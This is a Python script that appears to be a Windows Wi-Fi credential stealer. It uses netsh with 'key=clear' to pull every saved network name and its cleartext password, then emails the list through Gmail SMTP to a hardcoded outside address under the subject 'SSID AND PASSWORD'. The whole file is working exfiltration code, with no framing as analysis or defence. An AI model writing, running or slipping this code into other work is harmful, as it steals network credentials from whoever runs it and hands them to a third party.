
import code
from http import server
import ssl
import subprocess
import re
import smtplib
from email.message import EmailMessage
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders



command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

# We create an empty list outside of the loop where dictionaries with all the wifi username and passwords will be saved.
wifi_list = list()


# If we didn't find profile names we didn't have any wifi connections, so we only run the part to check for the details of the wifi and whether we can get their passwords in this part.
if len(profile_names) != 0:
    for name in profile_names:
        # Every wifi connection will need its own dictionary which will be appended to the wifi_list
        wifi_profile = dict()
        # We now run a more specific command to see the information about the specific wifi connection and if the Security key is not absent we can possibly get the password.
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
        # We use a regular expression to only look for the absent cases so we can ignore them.
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            # Assign the ssid of the wifi profile to the dictionary
            wifi_profile["ssid"] = name
            # These cases aren't absent and we should run them "key=clear" command part to get the password
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
            # Again run the regular expressions to capture the group after the : which is the password
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            # Check if we found a password in the regular expression. All wifi connections will not have passwords.
            if password == None:
                wifi_profile["password"] = None
            else:
                # We assign the grouping (Where the password is contained) we are interested to the password key in the dictionary.
                wifi_profile["password"] = password[1]
            # We append the wifi information to the wifi_list
            wifi_list.append(wifi_profile)

# Create the message for the email
email_message = ""
for item in wifi_list:
    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"

   
fromaddr = "dolajoi567@gmail.com"
toaddr = "manishjon1065@gmail.com"

# instance of MIMEMultipart
msg = MIMEMultipart()
  
# storing the senders email address  
msg['From'] = fromaddr
  
# storing the receivers email address 
msg['To'] = toaddr
  
# storing the subject 
msg['Subject'] = "SSID AND PASSWORD"
  
# string to store the body of the mail
body = email_message
  
# attach the body with the msg instance
msg.attach(MIMEText(body, 'plain'))
  
# attach the instance 'p' to instance 'msg'
# msg.attach(p)
  
# creates SMTP session
s = smtplib.SMTP('smtp.gmail.com', 587)
  
# start TLS for security
s.starttls()
  
# Authentication
s.login(fromaddr, "PASSWORD")
  
# Converts the Multipart msg into a string
text = msg.as_string()
  
# sending the mail
s.sendmail(fromaddr, toaddr, text)
  
# terminating the session
s.quit()
